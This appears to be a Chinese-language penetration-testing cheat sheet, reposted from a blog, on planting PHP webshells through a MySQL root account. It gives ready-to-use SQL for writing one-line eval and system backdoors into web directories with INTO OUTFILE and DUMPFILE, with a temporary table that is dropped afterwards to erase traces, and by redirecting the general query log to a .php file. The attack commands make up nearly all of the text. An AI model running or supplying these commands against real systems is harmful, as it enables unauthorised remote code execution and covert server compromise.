# mysql_root

---

来源：https://www.cnblogs.com/lktop/p/13779818.html

写shell前提条件：

1.数据库权限为root

2.secure_file_priv没有值

```
show global variables like '%secure_file_priv%'; 查看secure_file_priv的值
secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制
```

直接写shell

```
select '<php eval($_POST[shell])?>' into outfile 'c:\\shell.php';
select unhex('十六进制字符串') into dumpfile 'D:/WEB/shell.php';
```

创表写shell

```
1.先创建数据表
CREATE  table 'mysql'.'shell' ('webshell'  text not null);

2.向表单中写入一句话
insert Into mysql.shell values('<?php $eval($_POST[shell]);?>');

3.查询数据导出webshell
select 'webshell' from 'shell'  into outfile 'c:\\1.php';

4.删除表，清理痕迹。
drop table if exists 'shell';

汇总：
1.
use mysql;create table x(packet text) type=MYISaM;insert into x (packet) values('<pre><body ><?php @system($_GET["cmd"]); ?></body></pre>')select x  into outfile 'd:\php\xx.php'
2.
Create TABLE study (cmd text NOT NULL);Insert INTO study (cmd) VALUES('<?php eval ($_POST[cmd]) ?>');select cmd from study into outfile 'D:/php/www/htdocs/test/seven.php';Drop TABLE IF EXISTS study;
```

mysql日志写shell

```
1.查看genera文件配置情况
show global variables like "%genera%";

2.开启日志记录
set global general_log='on';

3.日志文件导出指定目录
set global general_log_file='C:/phpstudy/WWW/hp.php';

4.记录sql语句写马，演示一下，没有安全狗，直接传原马
select '<?php @eval($_POST["hp"]); ?>';

5.关闭记录（使用完一句话才关闭，不然可能该日志文件会删除）
set global general_log=off;
```

